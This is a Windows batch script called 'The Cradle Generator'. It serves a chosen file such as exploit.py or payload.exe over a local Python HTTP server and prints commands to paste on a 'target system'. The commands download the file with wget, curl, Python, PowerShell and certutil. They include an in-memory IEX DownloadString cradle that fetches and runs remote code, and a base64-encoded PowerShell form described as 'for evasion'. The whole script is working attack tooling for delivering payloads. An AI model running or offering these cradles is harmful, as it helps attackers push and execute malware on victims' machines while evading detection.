@echo off
setlocal enabledelayedexpansion

echo ========================================
echo The Cradle Generator
echo File Transfer Command Generator
echo ========================================
echo.

REM Check if filename was provided
if "%~1"=="" (
    echo ERROR: No filename specified!
    echo.
    echo Usage: cradle.bat [filename] [optional: port]
    echo Example: cradle.bat exploit.py
    echo Example: cradle.bat payload.exe 8000
    pause
    exit /b 1
)

set FILENAME=%~1
set PORT=%~2
if "%PORT%"=="" set PORT=8000

REM Check if file exists
if not exist "%FILENAME%" (
    echo WARNING: File "%FILENAME%" not found in current directory.
    echo Commands will be generated anyway.
    echo.
)

echo Detecting network interface IP...
echo.

REM Detect VPN/Network IP (tun0, eth0, or main adapter)
set LOCAL_IP=

REM Try to detect VPN interface first (OpenVPN, Wireguard)
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /C:"IPv4" ^| findstr /V "169.254"') do (
    set IP=%%a
    set IP=!IP: =!
    if not "!IP!"=="" (
        if not defined LOCAL_IP set LOCAL_IP=!IP!
    )
)

if not defined LOCAL_IP (
    echo ERROR: Could not detect IP address!
    echo Please ensure you're connected to a network.
    pause
    exit /b 1
)

echo Detected IP: %LOCAL_IP%
echo Port: %PORT%
echo File: %FILENAME%
echo.

REM Start HTTP server in background
echo Starting HTTP server on port %PORT%...
start /B python -m http.server %PORT% 2>nul
if %errorlevel% neq 0 (
    echo WARNING: Could not start HTTP server
    echo Make sure Python is installed
    echo.
)

echo ========================================
echo Generated Download Commands
echo ========================================
echo.

REM Store commands in a file
set OUTPUT_FILE=cradle_commands_%FILENAME%.txt
echo ======================================== > %OUTPUT_FILE%
echo Cradle Generator - %FILENAME% >> %OUTPUT_FILE%
echo ======================================== >> %OUTPUT_FILE%
echo Target IP: %LOCAL_IP% >> %OUTPUT_FILE%
echo Port: %PORT% >> %OUTPUT_FILE%
echo File: %FILENAME% >> %OUTPUT_FILE%
echo. >> %OUTPUT_FILE%

REM Linux/Unix Commands
echo [Linux/Unix Commands] >> %OUTPUT_FILE%
echo ---------------------------------------- >> %OUTPUT_FILE%
echo.
echo --- WGET ---
echo wget http://%LOCAL_IP%:%PORT%/%FILENAME%
echo wget http://%LOCAL_IP%:%PORT%/%FILENAME% >> %OUTPUT_FILE%
echo.

echo --- CURL ---
echo curl -O http://%LOCAL_IP%:%PORT%/%FILENAME%
echo curl -O http://%LOCAL_IP%:%PORT%/%FILENAME% >> %OUTPUT_FILE%
echo.

echo --- CURL (output to file) ---
echo curl http://%LOCAL_IP%:%PORT%/%FILENAME% -o %FILENAME%
echo curl http://%LOCAL_IP%:%PORT%/%FILENAME% -o %FILENAME% >> %OUTPUT_FILE%
echo.

REM Python Commands
echo. >> %OUTPUT_FILE%
echo [Python Commands] >> %OUTPUT_FILE%
echo ---------------------------------------- >> %OUTPUT_FILE%
echo.
echo --- Python 3 ---
echo python3 -c "import urllib.request; urllib.request.urlretrieve('http://%LOCAL_IP%:%PORT%/%FILENAME%', '%FILENAME%')"
echo python3 -c "import urllib.request; urllib.request.urlretrieve('http://%LOCAL_IP%:%PORT%/%FILENAME%', '%FILENAME%')" >> %OUTPUT_FILE%
echo.

echo --- Python 2 ---
echo python -c "import urllib; urllib.urlretrieve('http://%LOCAL_IP%:%PORT%/%FILENAME%', '%FILENAME%')"
echo python -c "import urllib; urllib.urlretrieve('http://%LOCAL_IP%:%PORT%/%FILENAME%', '%FILENAME%')" >> %OUTPUT_FILE%
echo.

REM PowerShell Commands
echo. >> %OUTPUT_FILE%
echo [PowerShell Commands] >> %OUTPUT_FILE%
echo ---------------------------------------- >> %OUTPUT_FILE%
echo.
echo --- PowerShell (Invoke-WebRequest) ---
echo powershell -c "Invoke-WebRequest -Uri 'http://%LOCAL_IP%:%PORT%/%FILENAME%' -OutFile '%FILENAME%'"
echo powershell -c "Invoke-WebRequest -Uri 'http://%LOCAL_IP%:%PORT%/%FILENAME%' -OutFile '%FILENAME%'" >> %OUTPUT_FILE%
echo.

echo --- PowerShell (IWR shorthand) ---
echo powershell -c "iwr -Uri http://%LOCAL_IP%:%PORT%/%FILENAME% -OutFile %FILENAME%"
echo powershell -c "iwr -Uri http://%LOCAL_IP%:%PORT%/%FILENAME% -OutFile %FILENAME%" >> %OUTPUT_FILE%
echo.

echo --- PowerShell (WebClient) ---
echo powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://%LOCAL_IP%:%PORT%/%FILENAME%', '%FILENAME%')"
echo powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://%LOCAL_IP%:%PORT%/%FILENAME%', '%FILENAME%')" >> %OUTPUT_FILE%
echo.

echo --- PowerShell (DownloadString - memory) ---
echo powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://%LOCAL_IP%:%PORT%/%FILENAME%')"
echo powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://%LOCAL_IP%:%PORT%/%FILENAME%')" >> %OUTPUT_FILE%
echo.

REM Certutil (Windows alternative)
echo. >> %OUTPUT_FILE%
echo [Windows Alternative] >> %OUTPUT_FILE%
echo ---------------------------------------- >> %OUTPUT_FILE%
echo.
echo --- Certutil ---
echo certutil -urlcache -split -f http://%LOCAL_IP%:%PORT%/%FILENAME%
echo certutil -urlcache -split -f http://%LOCAL_IP%:%PORT%/%FILENAME% >> %OUTPUT_FILE%
echo.

REM Base64 encoded PowerShell (for obfuscation)
echo. >> %OUTPUT_FILE%
echo [Encoded PowerShell] >> %OUTPUT_FILE%
echo ---------------------------------------- >> %OUTPUT_FILE%
set PS_CMD=IEX(New-Object Net.WebClient).DownloadString('http://%LOCAL_IP%:%PORT%/%FILENAME%')
echo.
echo --- Base64 Encoded (for evasion) ---
echo powershell -enc <base64_encoded_command>
echo Note: Use online encoder or: [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("%PS_CMD%"))
echo.

echo ========================================
echo.
echo Commands saved to: %OUTPUT_FILE%
echo HTTP Server running on port %PORT%
echo.
echo Copy and paste commands on target system.
echo Press Ctrl+C to stop the HTTP server.
echo ========================================

REM Copy first command to clipboard for convenience
echo wget http://%LOCAL_IP%:%PORT%/%FILENAME% | clip
echo.
echo ✓ First wget command copied to clipboard!

pause

REM Clean up - kill python HTTP server
taskkill /F /IM python.exe /FI "WINDOWTITLE eq http.server" >nul 2>&1

endlocal